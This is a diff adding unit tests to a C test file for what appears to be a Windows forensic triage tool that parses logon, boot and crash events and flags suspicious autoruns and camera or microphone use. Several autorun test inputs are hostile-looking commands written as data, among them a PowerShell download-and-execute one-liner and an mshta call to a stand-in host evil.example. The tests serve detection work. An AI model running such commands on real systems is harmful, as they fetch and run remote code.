@@ -1604,6 +1604,14 @@ int main(void)
         check_int("lsm 21", logon_parse(lsm, "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", &r) == 1 && r.kind == LK_SESSION_LOGON, 1);
         check_str("lsm user", r.user, "CORP\\alice");
         check_str("lsm console address dropped", r.source, "");
+        const char *lsm_tr = "<Event><System><EventID>21</EventID><TimeCreated SystemTime='2024-05-02T01:02:03.000Z'/></System>"
+                             "<UserData><EventXML><User>PC\\user</User><SessionID>1</SessionID><Address>YEREL</Address></EventXML></UserData></Event>";
+        logon_parse(lsm_tr, "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", &r);
+        check_str("lsm localized console word dropped (Turkish YEREL)", r.source, "");
+        const char *lsm_ip = "<Event><System><EventID>25</EventID><TimeCreated SystemTime='2024-05-02T01:02:03.000Z'/></System>"
+                             "<UserData><EventXML><User>PC\\user</User><SessionID>2</SessionID><Address>fe80::1%12</Address></EventXML></UserData></Event>";
+        logon_parse(lsm_ip, "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", &r);
+        check_str("lsm ipv6 client kept", r.source, "fe80::1%12");
         check_str("lsm session", r.session, "2");
         check_int("lsm id 21 in Security is something else", logon_parse(lsm, "Security", &r), 0);
         check_str("kind name", logon_kind_name(LK_EXPLICIT), "explicit");
@@ -1970,12 +1978,17 @@ int main(void)
         check_str("cam path", ap, "C:\\Users\\bob\\AppData\\Local\\Temp\\rat.exe");
         cam_app_path("C:#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", ap, 8);
         check_str("cam path clipped", ap, "C:\\aaaa");
-        check_int("cam mic from temp", cam_reason("microphone", "C:\\Users\\bob\\AppData\\Local\\Temp\\rat.exe", 1) != NULL, 1);
-        check_int("cam webcam from temp", cam_reason("Webcam", "C:\\Users\\bob\\AppData\\Local\\Temp\\rat.exe", 1) != NULL, 1);
-        check_int("cam mic from program files", cam_reason("microphone", "C:\\Program Files\\Zoom\\bin\\Zoom.exe", 1) == NULL, 1);
-        check_int("cam location from temp (not a recording device)", cam_reason("location", "C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe", 1) == NULL, 1);
-        check_int("cam packaged app", cam_reason("microphone", "Microsoft.WindowsCamera_8wekyb3d8bbwe", 0) == NULL, 1);
-        check_int("cam similar name", cam_reason("microphones", "C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe", 1) == NULL, 1);
+        const char *tmpx = "C:\\Users\\bob\\AppData\\Local\\Temp\\rat.exe", *disc = "C:\\Users\\bob\\AppData\\Local\\Discord\\app-1.0.9006\\Discord.exe";
+        check_int("cam unsigned in temp", cam_reason("microphone", tmpx, 1, 0) != NULL && strstr(cam_reason("microphone", tmpx, 1, 0), "unsigned") != NULL, 1);
+        check_int("cam unsigned webcam", cam_reason("Webcam", tmpx, 1, 0) != NULL && strstr(cam_reason("Webcam", tmpx, 1, 0), "camera") != NULL, 1);
+        check_int("cam signed per-user install (Discord)", cam_reason("microphone", disc, 1, 1) == NULL, 1);
+        check_int("cam deleted per-user install (old Discord version)", cam_reason("microphone", disc, 1, -1) == NULL, 1);
+        check_int("cam deleted file in temp", cam_reason("microphone", tmpx, 1, -1) != NULL, 1);
+        check_int("cam unknown file in Downloads", cam_reason("webcam", "C:\\Users\\bob\\Downloads\\x.exe", 1, -1) != NULL, 1);
+        check_int("cam unsigned in program files", cam_reason("microphone", "C:\\Program Files\\Zoom\\bin\\Zoom.exe", 1, 0) == NULL, 1);
+        check_int("cam location (not a recording device)", cam_reason("location", tmpx, 1, 0) == NULL, 1);
+        check_int("cam packaged app", cam_reason("microphone", "Microsoft.WindowsCamera_8wekyb3d8bbwe", 0, 0) == NULL, 1);
+        check_int("cam similar name", cam_reason("microphones", tmpx, 1, 0) == NULL, 1);
     }
 
     // --- logons: failures, and a success after many of them -----------------------
@@ -2000,18 +2013,18 @@ int main(void)
         size_t n = 0;
         for (int i = 0; i < 12; i++, n++) {
             rs[n].kind = LK_FAILED;
-            snprintf(rs[n].time, sizeof rs[n].time, "2024-05-01 10:%02d:00", i * 4);
+            snprintf(rs[n].time, sizeof rs[n].time, "2024-05-01 10:%02u:00", (unsigned)(i * 4) % 60u);
             snprintf(rs[n].source, sizeof rs[n].source, "203.0.113.7");
         }
         for (int i = 0; i < 3; i++, n++) {
             rs[n].kind = LK_FAILED;
-            snprintf(rs[n].time, sizeof rs[n].time, "2024-05-01 10:5%d:00", i);
+            snprintf(rs[n].time, sizeof rs[n].time, "2024-05-01 10:5%u:00", (unsigned)i % 10u);
             snprintf(rs[n].source, sizeof rs[n].source, "203.0.113.8");
         }
         const char *who[] = { "203.0.113.7", "203.0.113.8", "127.0.0.1", "" };
         for (int i = 0; i < 4; i++, n++) {
             rs[n].kind = LK_LOGON;
-            snprintf(rs[n].time, sizeof rs[n].time, "2024-05-01 10:55:0%d", i);
+            snprintf(rs[n].time, sizeof rs[n].time, "2024-05-01 10:55:0%u", (unsigned)i % 10u);
             snprintf(rs[n].source, sizeof rs[n].source, "%s", who[i]);
         }
         rs[n].kind = LK_LOGON;                                   // the guesser again: only the 10:44 failure is within the hour
@@ -2025,6 +2038,78 @@ int main(void)
         check_int("guess: no source", (int)logon_failures_before(pp, n, 18, 3600), 0);
         check_int("guess: only failures inside the window", (int)logon_failures_before(pp, n, 19, 3600), 1);
         check_int("guess: index out of range", (int)logon_failures_before(pp, n, 99, 3600), 0);
+    }
+
+    // --- loader-written sections are not compared ----------------------------------
+    {
+        check_int("fothk skipped", patch_loader_written_section("fothk\0\0\0"), 1);
+        check_int(".text compared", patch_loader_written_section(".text\0\0\0"), 0);
+        check_int("fothk prefix only", patch_loader_written_section("fothkxyz"), 0);
+        check_int(".fothk (other name)", patch_loader_written_section(".fothk\0\0"), 0);
+    }
+
+    // --- autoruns: what a command really runs; Microsoft's compat database ------
+    {
+        char t[600];
+        check_int("target nvidia cmd /c", asep_command_target("cmd.exe /C C:\\WINDOWS\\System32\\DriverStore\\FileRepository\\nv.inf_amd64_1\\NvContainerRecovery.bat NVDisplay %ProgramData%\\NVIDIA\\log.txt", t, sizeof t) == 1 &&
+                  strcmp(t, "C:\\WINDOWS\\System32\\DriverStore\\FileRepository\\nv.inf_amd64_1\\NvContainerRecovery.bat") == 0, 1);
+        check_int("target cmd /c start", asep_command_target("C:\\Windows\\System32\\cmd.exe /c start \"\" C:\\Users\\Public\\x.exe", t, sizeof t) == 1 &&
+                  strcmp(t, "C:\\Users\\Public\\x.exe") == 0, 1);
+        check_int("target cmd /c echo (no file)", asep_command_target("cmd /c echo hello", t, sizeof t), 0);
+        check_int("target powershell -file", asep_command_target("powershell.exe -NoProfile -File \"C:\\ProgramData\\a b\\x.ps1\" -Arg 1", t, sizeof t) == 1 &&
+                  strcmp(t, "C:\\ProgramData\\a b\\x.ps1") == 0, 1);
+        check_int("target powershell -command", asep_command_target("powershell -c \"iex (iwr http://x)\"", t, sizeof t), 0);
+        check_int("target wscript", asep_command_target("wscript.exe //B //NoLogo C:\\Users\\bob\\run.vbs", t, sizeof t) == 1 && strcmp(t, "C:\\Users\\bob\\run.vbs") == 0, 1);
+        check_int("target mshta url", asep_command_target("mshta.exe http://evil.example/a.hta", t, sizeof t) == 1 && strcmp(t, "http://evil.example/a.hta") == 0, 1);
+        check_int("target rundll32", asep_command_target("rundll32.exe C:\\Users\\x\\a.dll,Run", t, sizeof t) == 1 && strcmp(t, "C:\\Users\\x\\a.dll") == 0, 1);
+        check_int("target plain program", asep_command_target("\"C:\\Program Files\\A\\a.exe\" --log C:\\Users\\x\\l.txt", t, sizeof t) == 1 &&
+                  strcmp(t, "C:\\Program Files\\A\\a.exe") == 0, 1);
+        check_int("target empty", asep_command_target("   ", t, sizeof t), 0);
+
+        static const char *G = "{22221111-1111-1111-1111-111111111111}";
+        check_int("ms sdb", asep_ms_compat_sdb(G, "C:\\WINDOWS\\AppPatch\\CustomSDB\\{22221111-1111-1111-1111-111111111111}.sdb"), 1);
+        check_int("ms sdb windir", asep_ms_compat_sdb("{22221111-1111-1111-1111-111111111111}", "%windir%\\AppPatch\\CustomSDB\\{22221111-1111-1111-1111-111111111111}.sdb"), 1);
+        check_int("ms sdb other folder", asep_ms_compat_sdb(G, "C:\\Users\\Public\\{22221111-1111-1111-1111-111111111111}.sdb"), 0);
+        check_int("ms sdb other drive dir", asep_ms_compat_sdb(G, "C:\\Evil\\Windows\\AppPatch\\CustomSDB\\{22221111-1111-1111-1111-111111111111}.sdb"), 0);
+        check_int("ms sdb other guid", asep_ms_compat_sdb("{22221111-1111-1111-1111-111111111112}", "C:\\Windows\\AppPatch\\CustomSDB\\{22221111-1111-1111-1111-111111111112}.sdb"), 0);
+        check_int("ms sdb guid/file mismatch", asep_ms_compat_sdb(G, "C:\\Windows\\AppPatch\\CustomSDB\\{aaaaaaaa-1111-1111-1111-111111111111}.sdb"), 0);
+    }
+
+    // --- boots: current-Windows event shapes (named params, clock reason) ---------
+    {
+#define SYS(prov, id, data) "<Event><System><Provider Name='" prov "'/><EventID>" #id "</EventID>" \
+        "<TimeCreated SystemTime='2026-11-14T23:03:38.5Z'/><Channel>System</Channel></System><EventData>" data "</EventData></Event>"
+        boot_rec br;
+        const char *named = SYS("User32", 1074, "<Data Name='param1'>C:\\Windows\\System32\\RuntimeBroker.exe (DESKTOP-B)</Data><Data Name='param2'>DESKTOP-B</Data>"
+                                "<Data Name='param3'>Other (Unplanned)</Data><Data Name='param4'>0x0</Data><Data Name='param5'>restart</Data>"
+                                "<Data Name='param6'></Data><Data Name='param7'>DESKTOP-B\\user</Data><Data Name='param8'/>");
+        check_int("1074 named params", boot_parse(named, &br) == 1 && br.kind == BK_REQUEST, 1);
+        check_str("1074 named user", br.user, "DESKTOP-B\\user");
+        check_str("1074 named process", br.process, "C:\\Windows\\System32\\RuntimeBroker.exe");
+        check_str("1074 named action", br.action, "restart");
+        char pos[64];
+        check_int("pos mixed", evt_data_pos("<EventData><Data Name='a'>x</Data><Data/><Data>z</Data><DataItem>q</DataItem></EventData>", 2, pos, sizeof pos) == 1 &&
+                  strcmp(pos, "z") == 0, 1);
+        check_int("pos empty named", evt_data_pos("<Data Name='a'/><Data>b</Data>", 0, pos, sizeof pos) == 1 && pos[0] == 0, 1);
+        check_int("pos past end", evt_data_pos("<Data>b</Data>", 1, pos, sizeof pos), 0);
+        check_int("clock reason 2", boot_parse(SYS("Microsoft-Windows-Kernel-General", 1, "<Data Name='NewTime'>2026-11-13T19:24:10.0Z</Data>"
+                  "<Data Name='OldTime'>2026-11-11T21:37:53.0Z</Data><Data Name='Reason'>2</Data>"), &br) == 1 && br.clock_reason == 2 &&
+                  strstr(br.detail, "reason 2") != NULL, 1);
+        check_int("clock reason 1", boot_parse(SYS("Microsoft-Windows-Kernel-General", 1, "<Data Name='NewTime'>2026-11-13T10:00:00.0Z</Data>"
+                  "<Data Name='OldTime'>2026-11-13T12:00:00.0Z</Data><Data Name='Reason'>1</Data>"), &br) == 1 && br.clock_reason == 1 &&
+                  strstr(br.detail, "by an application or system component") != NULL, 1);
+        check_int("clock no reason (old logs)", boot_parse(SYS("Microsoft-Windows-Kernel-General", 1, "<Data Name='NewTime'>2026-11-13T10:00:00.0Z</Data>"
+                  "<Data Name='OldTime'>2026-11-13T12:00:00.0Z</Data>"), &br) == 1 && br.clock_reason == -1, 1);
+#undef SYS
+    }
+
+    // --- wer: packaged-app praid names -----------------------------------------
+    {
+        char t[] = "Version=1\r\nEventType=APPCRASH\r\nSig[0].Name=Application Name\r\nSig[0].Value=praid:App\r\n"
+                   "NsAppName=praid:App\r\nAppPath=C:\\Program Files\\WindowsApps\\Pkg_1.0_x64__abc\\Game.exe\r\n";
+        wer_report wr;
+        wer_parse(t, &wr);
+        check_str("wer praid -> basename", wr.app_name, "Game.exe");
     }
 
     fprintf(stderr, "\n%s (%d failure%s)\n",
